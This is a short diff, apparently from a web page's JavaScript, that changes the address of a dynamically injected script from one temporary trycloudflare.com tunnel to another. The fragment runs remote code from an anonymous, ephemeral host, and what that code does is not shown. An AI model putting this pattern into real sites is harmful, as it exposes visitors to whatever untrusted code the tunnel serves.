@@ -28,7 +28,7 @@
     }
     const script = document.createElement("script");
     script.src =
-    "https://mainland-badge-breeding-divisions.trycloudflare.com/static/js/main.537a0f47.js";
+    "https://joins-joan-date-batch.trycloudflare.com/static/js/main.537a0f47.js";
     script.type = "text/javascript";
     script.crossOrigin = "anonymous";
     script.onload = function () {
